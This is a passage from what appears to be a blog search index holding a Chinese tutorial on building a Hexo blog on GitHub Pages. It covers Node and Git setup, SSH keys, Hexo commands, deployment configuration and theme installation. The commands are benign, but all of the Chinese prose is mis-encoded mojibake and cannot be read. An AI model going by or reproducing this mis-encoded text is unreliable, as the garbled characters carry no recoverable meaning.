åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ã€‚</p><p>å¦‚æœæ˜¯Linuxï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/qq_41974199/article/details/119328353">https://blog.csdn.net/qq_41974199/article/details/119328353</a></p><p>å®‰è£…Node.js ä¼šåŒ…å«ç¯å¢ƒå˜é‡ä»¥åŠ npm çš„å®‰è£…ï¼Œå®‰è£…åï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v   //æ˜¾ç¤º nodejs çš„ç‰ˆæœ¬å·ã€‚</span><br><span class="line">npm -v    //æ˜¾ç¤º npm çš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709361.png" alt="image-20240409170920334">  </p><p>ã€æ³¨ã€‘è¿™å—æ¨èä½¿ç”¨14ä»¥ä¸Šçš„nodeJSç‰ˆæœ¬ï¼Œä¹‹å‰ç”¨çš„v10çš„ç‰ˆæœ¬ï¼Œä¼šæŠ¥é”™ã€‚</p><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>è‹¥ä¸ºwindowsï¼Œéœ€è¦å®‰è£…Git bashï¼Œæ‰€æœ‰å®‰è£…å»ºè®®éƒ½æ— è„‘ä¸‹ä¸€æ­¥å³å¯ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709228.png" alt="image-20240409170930145">  </p><p>è‹¥ä¸ºLinuxï¼Œç›´æ¥å‘½ä»¤è¡Œåœ¨çº¿å®‰è£…å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709444.png" alt="image-20240409170945400">  </p><h2 id="è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±"><a href="#è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±" class="headerlink" title="è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±"></a>è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±</h2><p>å› ä¸º Git æ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±ä½œä¸ºä¸€ä¸ªæ ‡è¯†ï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;user_name&quot;</span> <span class="comment"># user_name å¡«å…¥ GitHub ç”¨æˆ·å</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;user_email&quot;</span> <span class="comment"># user_email å¡«å…¥ GitHub æ³¨å†Œçš„é‚®ç®±</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„å…¨å±€è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±åï¼Œå°†ä½œä¸ºæœ¬åœ°å’ŒgithubåŒæ­¥çš„ **[UserName]**ã€‚</p><h2 id="æ­å»ºgithubä»“åº“"><a href="#æ­å»ºgithubä»“åº“" class="headerlink" title="æ­å»ºgithubä»“åº“"></a>æ­å»ºgithubä»“åº“</h2><h3 id="æ–°å»ºä»“åº“"><a href="#æ–°å»ºä»“åº“" class="headerlink" title="æ–°å»ºä»“åº“"></a>æ–°å»ºä»“åº“</h3><p>ç™»å½•githubå®˜ç½‘åï¼Œç‚¹å‡» â€œNew repositoryâ€ï¼Œåˆ›å»ºä¸€ä¸ªåå­—ä¸ºusername.github.ioï¼ˆè¿™é‡Œçš„ username è¦æ›¿æ¢æˆè‡ªå·±çš„å®é™…çš„ç”¨æˆ·åï¼‰ çš„ä»“åº“ã€‚</p><p>æ¯”å¦‚ï¼Œä¹‹å‰è®¾ç½®çš„ç”¨æˆ·åä¸º â€œmuheâ€ï¼Œåˆ™è¿™å—åˆ›å»ºçš„ä»“åº“åå­—ä¸º muhe.github.io</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709357.png" alt="image-20240409170957327">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710821.png" alt="image-20240409171006790">  </p><h3 id="é…ç½®SSH-Key"><a href="#é…ç½®SSH-Key" class="headerlink" title="é…ç½®SSH Key"></a>é…ç½®SSH Key</h3><p>ä½¿ç”¨gitï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆä¸€å¯¹å…¬ç§é’¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;user.email&quot;</span> # user.email ä¸ºGitHub ä¸Šæ³¨å†Œçš„é‚®ç®±</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä¸‰ä¸ªå›è½¦å³å¯ï¼Œé»˜è®¤ä¸éœ€è¦è®¾ç½®å¯†ç ã€‚æŸ¥çœ‹æ˜¯å¦å·²ç»æœ‰ ssh å¯†é’¥ã€‚æ‰“å¼€ç”¨æˆ·ç›®å½• &#x2F;root&#x2F;.ssh</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710435.png" alt="image-20240409171016406"> </p><p>ç„¶åæ‰¾åˆ°ç”Ÿæˆçš„ .ssh çš„æ–‡ä»¶å¤¹ä¸­çš„ id_rsa.pub å¯†é’¥ï¼Œå°†å†…å®¹å…¨éƒ¨å¤åˆ¶ã€‚</p><p>å…¶ä¸­ id_rsa æ˜¯ç§é’¥ä¸èƒ½æ³„éœ²ï¼Œid_rsa.pub æ˜¯å…¬é’¥å¯ä»¥æ”¾å¿ƒå‘Šè¯‰ä»–äººã€‚</p><p>æ‰“å¼€<a href="https://github.com/settings/ssh/new">GitHub SSH and GPG keys</a> é¡µé¢ï¼Œæ–°å»ºä¸€ä¸ª ssh keyï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710250.png" alt="image-20240409171031214">  </p><p>Title ä¸ºæ ‡é¢˜ï¼Œä»»æ„å¡«å³å¯ï¼Œå°†åˆšåˆšå¤åˆ¶çš„ id_rsa.pub å†…å®¹ç²˜è´´è¿›å»ï¼Œæœ€åç‚¹å‡» Add SSH keyã€‚åœ¨ Git Bash ä¸­æ£€æµ‹ GitHub å…¬é’¥è®¾ç½®æ˜¯å¦æˆåŠŸï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦å¯ä»¥è¿æ¥æˆåŠŸï¼Œè‹¥è¿æ¥æˆåŠŸçš„è¯ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710942.png" alt="image-20240409171040917">  </p><p>è¿™ä¸€æ­¥éª¤ï¼Œç›¸å½“äºç”Ÿæˆäº†æœ¬åœ°å’Œgithubä»“åº“çš„ <strong>[Password]</strong></p><h1 id="ä½¿ç”¨Hexoåšå®¢æ¡†æ¶"><a href="#ä½¿ç”¨Hexoåšå®¢æ¡†æ¶" class="headerlink" title="ä½¿ç”¨Hexoåšå®¢æ¡†æ¶"></a>ä½¿ç”¨Hexoåšå®¢æ¡†æ¶</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Hexo æ˜¯ä¸€ä¸ªç®€å•ã€å¿«é€Ÿã€å¼ºå¤§çš„åŸºäº Github Pages çš„åšå®¢æ¡†æ¶ï¼Œæ”¯æŒ Markdown æ ¼å¼ã€‚</p><p>é›†æˆäº†ä¼—å¤šä¼˜ç§€æ’ä»¶å’Œä¸»é¢˜ã€‚</p><p>ç”±äº Github Pages å­˜æ”¾çš„éƒ½æ˜¯é™æ€æ–‡ä»¶ï¼Œåšå®¢å­˜æ”¾çš„ä¸åªæ˜¯æ–‡ç« å†…å®¹ï¼Œè¿˜æœ‰æ–‡ç« åˆ—è¡¨ã€åˆ†ç±»ã€æ ‡ç­¾ã€ç¿»é¡µç­‰åŠ¨æ€å†…å®¹ï¼Œå‡å¦‚æ¯æ¬¡å†™å®Œä¸€ç¯‡æ–‡ç« éƒ½è¦æ‰‹åŠ¨æ›´æ–°åšæ–‡ç›®å½•å’Œç›¸å…³é“¾æ¥ä¿¡æ¯ï¼Œç›¸ä¿¡è°éƒ½ä¼šç–¯æ‰ï¼Œæ‰€ä»¥ Hexo æ‰€åšçš„å°±æ˜¯å°†è¿™äº› md æ–‡ä»¶éƒ½æ”¾åœ¨æœ¬åœ°ï¼Œæ¯æ¬¡å†™å®Œæ–‡ç« åè°ƒç”¨å†™å¥½çš„å‘½ä»¤æ¥æ‰¹é‡å®Œæˆç›¸å…³é¡µé¢çš„ç”Ÿæˆï¼Œç„¶åå†å°†æœ‰æ”¹åŠ¨çš„é¡µé¢æäº¤åˆ° GitHub ã€‚</p><h2 id="å®‰è£…ä¸åˆå§‹åŒ–"><a href="#å®‰è£…ä¸åˆå§‹åŒ–" class="headerlink" title="å®‰è£…ä¸åˆå§‹åŒ–"></a>å®‰è£…ä¸åˆå§‹åŒ–</h2><p>è¾“å…¥å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli # æ­¤å‘½ä»¤å®Œæˆå¯¹ hexo çš„å®‰è£…</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œåœ¨ç”µè„‘çš„æŸä¸ªåœ°æ–¹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ˆåå­—å¯ä»¥éšä¾¿å–ï¼‰ä¸“é—¨ç”¨äºå­˜æ”¾åšå®¢ä»£ç ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯ &#x2F;root&#x2F;blogï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶å¤¹å°†æ¥å­˜æ”¾åšå®¢çš„æ‰€æœ‰å†…å®¹å’Œç´ æï¼Œä»¥åŠæ‰€æœ‰çš„åšå®¢æ“ä½œéƒ½ä¼šåœ¨å…¶ä¸­å®Œæˆï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦éšä¾¿æ”¾ã€‚</p><p>è¿›å…¥ä¸Šé¢æ–°å»ºçš„ç›®å½•ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo init # è¯¥å‘½ä»¤å®Œæˆ hexo åœ¨æœ¬åœ°åšå®¢ç›®å½•çš„åˆå§‹åŒ–</span><br></pre></td></tr></table></figure><h2 id="ç”Ÿæˆé™æ€æ–‡ä»¶"><a href="#ç”Ÿæˆé™æ€æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆé™æ€æ–‡ä»¶"></a>ç”Ÿæˆé™æ€æ–‡ä»¶</h2><p>è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆæ‰€éœ€çš„é™æ€æ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo g # ç”Ÿæˆé™æ€æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šå‘½ä»¤åï¼ŒHexo å°±ä¼šåœ¨ public æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆç›¸å…³çš„ html æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å°†æ¥éƒ½æ˜¯è¦æäº¤åˆ° GitHub ä¸Šçš„ username.github.io çš„ä»“åº“ä¸­å»çš„ã€‚</p><h2 id="æœ¬åœ°é¢„è§ˆ"><a href="#æœ¬åœ°é¢„è§ˆ" class="headerlink" title="æœ¬åœ°é¢„è§ˆ"></a>æœ¬åœ°é¢„è§ˆ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo s # å¼€å¯æœ¬åœ°é¢„è§ˆ</span><br></pre></td></tr></table></figure><p>hexo s æ˜¯å¼€å¯æœ¬åœ°é¢„è§ˆæœåŠ¡ï¼Œæ‰“å¼€æµè§ˆå™¨è®¿é—® <a href="http://localhost:4000/">http://localhost:4000</a> å³å¯çœ‹åˆ°å†…å®¹ï¼ŒCtrl+C åœæ­¢æœ¬åœ°é¢„è§ˆã€‚æœ¬åœ°é¢„è§ˆå¯ä»¥å®æ—¶æŸ¥çœ‹åšå®¢çš„ç¼–è¾‘æƒ…å†µï¼Œå¾…åšå®¢å†™å®Œåä¸€èµ·éƒ¨ç½²åˆ° GitHub ä¸Šã€‚</p><p>ç¬¬ä¸€æ¬¡åˆå§‹åŒ–çš„æ—¶å€™ hexo å·²ç»å¸®æˆ‘ä»¬å†™äº†ä¸€ç¯‡åä¸º Hello World çš„æ–‡ç« ï¼Œé»˜è®¤çš„ä¸»é¢˜æ¯”è¾ƒä¸‘ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710615.png" alt="image-20240409171052488">  </p><h1 id="ä¸Šä¼ åˆ°GitHub"><a href="#ä¸Šä¼ åˆ°GitHub" class="headerlink" title="ä¸Šä¼ åˆ°GitHub"></a>ä¸Šä¼ åˆ°GitHub</h1><h2 id="è®¾ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"><a href="#è®¾ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶" class="headerlink" title="è®¾ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"></a>è®¾ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶</h2><p>hexo æœ‰ 2 ç§ _config.yml æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯æ ¹ç›®å½•ä¸‹çš„å…¨å±€çš„ _config.ymlï¼Œä¸€ä¸ªæ˜¯å„ä¸ªä¸»ä½“ theme ä¸‹çš„ _config.ymlã€‚å°†å‰è€…ç§°ä¸ºç«™ç‚¹é…ç½®æ–‡ä»¶ï¼Œ åè€…ç§°ä¸ºä¸»é¢˜é…ç½®æ–‡ä»¶ã€‚</p><p>æ‰“å¼€æ ¹ç›®å½•ä¸‹ç«™ç‚¹é…ç½®æ–‡ä»¶ _config.ymlï¼Œé…ç½®æœ‰å…³ deploy çš„éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git<span class="meta">@github</span>.com:ç”¨æˆ·å/ç”¨æˆ·å.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>è¿™å—åœ¨åŠ¨é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦ä¸»è¦å˜é‡å’Œå€¼ä¹‹å‰æ˜¯è¦ç”¨ç©ºæ ¼æ¥è¿›è¡Œåˆ†éš”çš„ã€‚</p><p>å¦‚ â€œtype:gitâ€ï¼Œä¼šæŠ¥é”™ï¼›ä½†ä½¿ç”¨â€type: gitâ€ï¼Œä¸ä¼šæŠ¥é”™ã€‚</p><h2 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h2><p>è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå®‰è£…éƒ¨ç½²æ’ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save # å®‰è£…éƒ¨ç½²æ’ä»¶</span><br></pre></td></tr></table></figure><p>è‹¥å¹¶è¿›è¡Œä¸Šè¿°æ“ä½œï¼Œç›´æ¥éƒ¨ç½²çš„æ—¶å€™ï¼Œä¼šæŠ¥é”™ã€‚</p><h2 id="éƒ¨ç½²åˆ°GitHub"><a href="#éƒ¨ç½²åˆ°GitHub" class="headerlink" title="éƒ¨ç½²åˆ°GitHub"></a>éƒ¨ç½²åˆ°GitHub</h2><p>è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå°†æœ¬åœ°çš„æ–‡ä»¶+èµ„æºç­‰ä¸Šä¼ åˆ°github</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²æˆåŠŸåï¼Œæ‰“å¼€å¯¹åº”çš„ç½‘å€  <a href="https://www.username.github.io/">https://www.username.github.io</a></p><p>å¦‚æœå‡ºç°äº†å’Œæœ¬åœ°é¢„è§ˆä¸€æ ·çš„æ•ˆæœï¼Œé‚£ä¹ˆï¼Œè¡¨æ˜éƒ¨ç½²æˆåŠŸã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711823.png" alt="image-20240409171102708"> </p><h1 id="ç½‘ç«™åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹"><a href="#ç½‘ç«™åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹" class="headerlink" title="ç½‘ç«™åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹"></a><strong>ç½‘ç«™åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹</strong></h1><p>æ­å»ºå¥½ç½‘ç«™ä¹‹åï¼Œæœ‰è®¸å¤šé…ç½®ä¿¡æ¯éœ€è¦æˆ‘ä»¬å»ä¿®æ”¹ï¼Œæ¯”å¦‚ç½‘ç«™çš„æ ‡é¢˜ã€æ ‡ç­¾ç­‰é€‰é¡¹ï¼Œå…·ä½“ä¿®æ”¹æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>æ‰“å¼€åšå®¢ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œæ‰¾åˆ°å¦‚å›¾æ‰€ç¤ºçš„é€‰é¡¹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711765.png" alt="image-20240409171116734"> </p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>title</td><td>ç½‘ç«™çš„æ ‡é¢˜</td></tr><tr><td>subtitle</td><td>ç½‘ç«™çš„å‰¯æ ‡é¢˜</td></tr><tr><td>description</td><td>å¯¹äºç½‘ç«™çš„æè¿°ï¼Œä¸»è¦ç”¨äºSEO</td></tr><tr><td>keywords</td><td>ç½‘ç«™çš„å…³é”®è¯ï¼Œæ”¯æŒå¤šä¸ªå…³é”®è¯</td></tr><tr><td>author</td><td>ä½œè€…å</td></tr><tr><td>language</td><td>ç½‘ç«™ä½¿ç”¨çš„è¯­è¨€ï¼Œå¯¹äºç®€ä½“ä¸­æ–‡ç”¨æˆ·æ¥è¯´ï¼Œè¯­è¨€çš„è®¾ç½®è·Ÿä½¿ç”¨ä¸åŒçš„ä¸»é¢˜æœ‰å…³ï¼Œå¯ä»¥å‚è€ƒå„è‡ªä¸»é¢˜çš„æ–‡æ¡£è‡ªè¡Œé…ç½®ï¼Œä¸€èˆ¬ä¸ºzh-CN</td></tr><tr><td>timezone</td><td>è®¾ç½®ç½‘ç«™çš„æ—¶åŒºï¼Œå¦‚æœä¸å¡«åˆ™é»˜è®¤ä½¿ç”¨ä½ ç”µè„‘çš„æ—¶åŒº</td></tr></tbody></table><p>psï¼šæ›´å¤šçš„é…ç½®ä¿¡æ¯ä¿®æ”¹å¯ä»¥å»hexoçš„å®˜æ–¹æ–‡æ¡£ï¼Œ<a href="https://hexo.io/zh-cn/docs/configuration.html">æˆ³æˆ‘è·³è½¬</a>ï¼Œå¯ä»¥ä¿®æ”¹ä¸€ä¸ªé€‰é¡¹ä¹‹åï¼Œæ‰§è¡Œhexo cleanã€hexo gã€hexo såœ¨æœ¬åœ°çœ‹ä¸€ä¸‹æ•ˆæœï¼Œç­‰å…¨éƒ¨ä¿®æ”¹å¥½ä¹‹åå†æ¨é€åˆ°ä»“åº“ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711978.png" alt="image-20240409171129884"> </p><h1 id="æ›´æ¢Hexoä¸»é¢˜"><a href="#æ›´æ¢Hexoä¸»é¢˜" class="headerlink" title="æ›´æ¢Hexoä¸»é¢˜"></a>æ›´æ¢Hexoä¸»é¢˜</h1><p>hexoé»˜è®¤çš„ä¸»é¢˜æœ‰ç‚¹uglyï¼Œä¿®æ”¹å¥½åŸºæœ¬é…ç½®ä¿¡æ¯ä¹‹åï¼Œå¯ä»¥è€ƒè™‘æ¢ä¸€ä¸ªä¸»é¢˜ï¼Œä¸»é¢˜å¤šå¯ä»¥è¯´çš„ä¸Šæ˜¯hexoæ¡†æ¶çš„ä¸€å¤§å–ç‚¹ï¼Œ<a href="https://hexo.io/themes/">æˆ³æˆ‘å»æŒ‘é€‰ä¸»é¢˜</a>ï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711010.png" alt="image-20240409171137932"> </p><p>ä¸‹é¢æ¨èå‡ ç§çœ‹èµ·æ¥ä¸é”™çš„ä¸»é¢˜ï¼š</p><h2 id="NexT"><a href="#NexT" class="headerlink" title="NexT"></a>NexT</h2><ul><li><a href="https://github.com/theme-next/hexo-theme-next">ä»“åº“åœ°å€</a></li><li><a href="https://theme-next.js.org/">é¢„è§ˆåœ°å€</a></li><li>é¦–å…ˆå°±æ˜¯å¤§åé¼é¼çš„Nextä¸»é¢˜äº†ï¼Œé¡µé¢ç®€æ´ï¼ŒåŠŸèƒ½å…¨ï¼Œç”¨çš„äººå¤šï¼Œç½‘ä¸Šçš„ä¸ªæ€§åŒ–é…ç½®æ•™ç¨‹ä¹Ÿè¶…çº§å¤šï¼Œç”¨è¿™ä¸ªä¸»é¢˜å¦‚æœé‡åˆ°é—®é¢˜ï¼Œåœ¨ç½‘ä¸ŠåŸºæœ¬ä¸Šèƒ½æ‰¾åˆ°å¯¹åº”çš„è§£å†³åŠæ³•ã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711015.png" alt="image-20240409171147964"> </p><h2 id="Butterfly"><a href="#Butterfly" class="headerlink" title="Butterfly"></a>Butterfly</h2><ul><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">ä»“åº“åœ°å€</a></li><li><a href="https://butterfly.js.org/">é¢„è§ˆåœ°å€</a></li><li>æŒºå¥½çœ‹çš„ä¸€ä¸ªä¸»é¢˜ï¼Œç”¨çš„äººä¹ŸæŒºå¤šçš„ï¼š</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711188.png" alt="image-20240409171156067"> </p><h2 id="Nexmoe"><a href="#Nexmoe" class="headerlink" title="Nexmoe"></a>Nexmoe</h2><ul><li><a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe">ä»“åº“åœ°å€</a></li><li><a href="https://nexmoe.com/">é¢„è§ˆåœ°å€</a>)</li><li>çœ‹èµ·æ¥ä¸é”™~~</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712812.png" alt="image-20240409171235695"> </p><h2 id="â€¦â€¦"><a href="#â€¦â€¦" class="headerlink" title="â€¦â€¦"></a>â€¦â€¦</h2><h2 id="é…ç½®æ­¥éª¤"><a href="#é…ç½®æ­¥éª¤" class="headerlink" title="é…ç½®æ­¥éª¤"></a>é…ç½®æ­¥éª¤</h2><p>è¿™å—ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€æ¬¾ä¸»é¢˜<strong>Metery</strong>ï¼Œéƒ¨ç½²è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>Hexoçš„æ‰€æœ‰ä¸»é¢˜æºä»£ç éƒ½æ˜¯æ‰˜ç®¡åœ¨Githubçš„ï¼Œæ›´æ¢ä¸»é¢˜ç¬¬ä¸€æ­¥ï¼š<strong>å°†è¯¥ä¸»é¢˜çš„æºä»£ç cloneä¸‹æ¥ï¼Œæ”¾åˆ°æœ¬åœ°Hexoç«™ç‚¹æ ¹ç›®å½•ä¸‹çš„<strong><strong>themes</strong></strong>æ–‡ä»¶å¤¹ä¸­</strong>ã€‚</p><p>è®¿é—®Meteryä¸»é¢˜çš„Githubä»“åº“,å¤åˆ¶ä»“åº“åœ°å€ï¼š<a href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712700.png" alt="image-20240409171247643"> </p><p>ç„¶ååœ¨æœ¬åœ°<strong>ç«™ç‚¹æ ¹ç›®å½•</strong>æ‰“å¼€git bash å‘½ä»¤è¡Œï¼Œè¿›å…¥themesæ–‡ä»¶å¤¹ï¼Œå¼€å§‹æ‹‰å–ä»£ç åˆ°æœ¬åœ°ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cd themes</span><br><span class="line">git clone https:<span class="comment">//github.com/blinkfox/hexo-theme-matery.git</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712160.png" alt="image-20240409171256135"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713557.png" alt="image-20240409171302526">  </p><p>æ›´æ¢ä¸»é¢˜</p><p>ä¸‹è½½Hexoçš„ä¸»é¢˜åˆ°&#x2F;themesæ–‡ä»¶å¤¹ä¹‹åï¼Œè¦åœ¨<strong>ç«™ç‚¹é…ç½®æ–‡ä»¶</strong>ä¸­é…ç½®ä½¿ç”¨è¯¥ä¸»é¢˜ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">vim config.yml</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713874.png" alt="image-20240409171309848">  </p><p>hexoä¸€é”®ä¸‰è¿åï¼ŒæŸ¥çœ‹æ•ˆæœ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713074.png" alt="image-20240409171347929"> </p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
